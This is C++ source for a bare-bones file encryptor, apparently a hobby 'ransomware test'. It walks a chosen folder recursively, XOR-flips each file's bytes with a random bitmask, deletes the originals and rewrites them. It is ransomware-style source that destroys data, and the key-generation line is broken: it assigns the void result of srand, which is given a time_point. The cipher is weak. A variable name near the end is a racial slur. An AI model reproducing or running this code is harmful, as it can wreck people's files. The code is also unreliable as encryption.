#include <iostream>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <cstdlib>
#include <bitset>
#include <thread>
#include <stdio.h>
#include <math.h>
#include <algorithm>
namespace fs = std::filesystem;

std::vector<unsigned char> DecimalToBinary(unsigned char decimal) {
	std::vector<unsigned char> binaryByte;
	float currentDecimal = decimal;
	for (int i = 0; i < 8; i++) {
		currentDecimal /= 2;
		if (ceil(currentDecimal) > currentDecimal) {
			binaryByte.push_back(1);
			currentDecimal = floor(currentDecimal);
		}
		else {
			binaryByte.push_back(0);
		}
	}
	// might remove reverse function later
	std::reverse(binaryByte.begin(), binaryByte.end());
	return binaryByte;
}

std::string fixed_getline()
{
	std::string result;

	while (!std::getline(std::cin, result) || result.empty());

	return result;
}


unsigned char BinaryToDecimal(std::vector<unsigned char> binary) {
	// might remove reverse function later
	std::reverse(binary.begin(), binary.end());
	int currentValue = 1;
	unsigned char decimal = 0;
	for (int i = 0; i < 8; i++) {
		if (binary[i] == 1) {
			decimal += currentValue;
		}
		currentValue *= 2;
	}
	return decimal;
}

std::vector<unsigned char> Encrypt(std::vector<unsigned char> inputData, std::vector<unsigned char> bitmask) {
	int byteIndex = 0;
	int bitmaskIndex = 0;

	// for each bit check if bitmask value at same index is 1, if the bitmask value is 1 then flip the bit
	for (unsigned char byte : inputData) {
		std::vector<unsigned char> binaryByte = DecimalToBinary(byte);
		for (int i = 0; i < 8; i++) {
			if (bitmaskIndex == bitmask.size()) {
				bitmaskIndex = 0;
			}
			if (bitmask[bitmaskIndex] == 1) {
				if (binaryByte[i] == 1) {
					binaryByte[i] = 0;
				}
				else {
					binaryByte[i] = 1;
				}
			}
			bitmaskIndex++;
		}
		inputData[byteIndex] = BinaryToDecimal(binaryByte);
		byteIndex++;
	}
	return inputData;
}

std::vector<unsigned char> Decrypt(std::vector<unsigned char> inputData, std::vector<unsigned char> bitmask) {
	int byteIndex = 0;
	int bitmaskIndex = 0;

	// for each bit check if bitmask value at same index is 1, if the bitmask value is 1 then flip the bit
	for (unsigned char byte : inputData) {
		std::vector<unsigned char> binaryByte = DecimalToBinary(byte);
		for (int i = 0; i < 8; i++) {
			if (bitmaskIndex == bitmask.size()) {
				bitmaskIndex = 0;
			}
			if (bitmask[bitmaskIndex] == 1) {
				if (binaryByte[i] == 1) {
					binaryByte[i] = 0;
				}
				else {
					binaryByte[i] = 1;
				}
			}
			bitmaskIndex++;
		}
		inputData[byteIndex] = BinaryToDecimal(binaryByte);
		byteIndex++;
	}
	return inputData;
}

std::vector<unsigned char> bitmaskGenerator(int size) {
	// Valid bitmask sizes: 8-bit, 16-bit, 32-bit, 64-bit, 128-bit, 256-bit
	std::vector<unsigned char> bitmask;
	std::cout << "Generating bitmask key..." << std::endl;
	using time_stamp = std::chrono::time_point<std::chrono::system_clock, std::chrono::nanoseconds>;
	for (int i = 0; i < size; i++) {
		time_stamp ts = 
		srand(std::chrono::time_point_cast<std::chrono::nanoseconds>(std::chrono::system_clock::now()));
		std::this_thread::sleep_for(std::chrono::milliseconds(1100));
		bitmask.push_back(rand()%2);
	}
	std::cout << "Bitmask key generated! Save the key to decrypt your files: ";
	// Get string from unsigned char vector
	std::string bitmaskString;
	for (unsigned char c : bitmask) {
		if (c == 1) {
			bitmaskString += "1";
		}
		else if (c == 0) {
			bitmaskString += "0";
		}
	}
	std::cout << bitmaskString << std::endl;
	return bitmask;
}

void EncryptionDecryptionProcess(bool decrypt, int bitmaskSize, std::string encryptionFolder) {
	// 16-bit bitmask as encryption key, more bits can be added for 32, 64, 128 or 256 bit encryption
	std::vector<unsigned char> bitmask; // { 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1 }
	if (decrypt) {
		std::string keyInput;
		std::cout << "Enter bitmask key: " << std::endl;
		std::cin >> keyInput;

		for (char& c : keyInput) {
			if (c == '1') {
				bitmask.push_back(1);
			}
			else if (c == '0') {
				bitmask.push_back(0);
			}
			else {
				std::cout << "Incorrect format!";
			}
		}
	}
	else {
		bitmask = bitmaskGenerator(bitmaskSize);
	}

	

	// get folder(s) to encrypt
	//std::string encryptionFolder = "C:\\Users\\TimAn\\source\\repos\\ransomware test\\x64\\Debug\\scheithomo\\";
	for (const auto& entry : fs::recursive_directory_iterator(encryptionFolder))
		// check if directory entry is a subdirectory
		if (entry.is_directory() == false) {
			std::ifstream currentFile;
			// get file data
			currentFile.open(entry.path(), std::ios::app | std::ios::binary);
			if (!currentFile) {
				std::cerr << "Could not open file: " + entry.path().string() << std::endl;
			}
			else {
				std::vector<unsigned char> fileDataBuffer;
				currentFile.seekg(0, std::ios::end);
				fileDataBuffer.resize(currentFile.tellg());
				currentFile.seekg(0, std::ios::beg);

				currentFile.read(reinterpret_cast<char*>(fileDataBuffer.data()), fileDataBuffer.size());
				std::cout << entry.path().string() << std::endl;
				currentFile.close();

				// ------------------------------------------------------------------
				// ENCRYPTION/DECRYPTION PROCESS STARTS HERE
				// ------------------------------------------------------------------
				
				if (decrypt == false) {
					// encrypt
					fileDataBuffer = Encrypt(fileDataBuffer, bitmask);
				}
				else {
					// decrypt
					fileDataBuffer = Decrypt(fileDataBuffer, bitmask);
				}

				// ------------------------------------------------------------------
				// ENCRYPTION/DECRYPTION PROCESS ENDS HERE
				// ------------------------------------------------------------------
				
				// remove old file
				std::remove(entry.path().string().c_str());

				// write file data to new file
				std::ofstream encryptedFile;
				encryptedFile.open(entry.path(), std::ios::app | std::ios::binary);
				encryptedFile.write(reinterpret_cast<char*>(fileDataBuffer.data()), fileDataBuffer.size());
				encryptedFile.close();
			}
		}
	std::string nigs;
	std::cout << "done" << std::endl;
	std::cin >> nigs;
};

int main() {
	std::string choice;

	std::cout << "recommended to run in safe environment do you want to continue? (y/n)" << std::endl;
	std::cin >> choice;

	if (choice == "yes" || choice == "y") {
		std::string encryptionFolder, choice2;

		std::cout << "enter the path of the folder you want to encrypt or decrypt: ";
		encryptionFolder = fixed_getline();

		std::cout << "do you want to encrypt or decrypt?" << std::endl;
		choice2 = fixed_getline();

		bool decrypt;
		int bitmaskSize = 8;
		if (choice2 == "encrypt") {
			decrypt = false;
			std::cout << "Enter key size in bits (8, 16, 32, 64, 128, 256) (default: 8): " << std::endl;
			std::cin >> bitmaskSize;
		}
		else if (choice2 == "decrypt") {
			decrypt = true;
		}
		EncryptionDecryptionProcess(decrypt, bitmaskSize, encryptionFolder);
	}
	else {
		std::cout << "Closing program";
		exit(1);
	}
}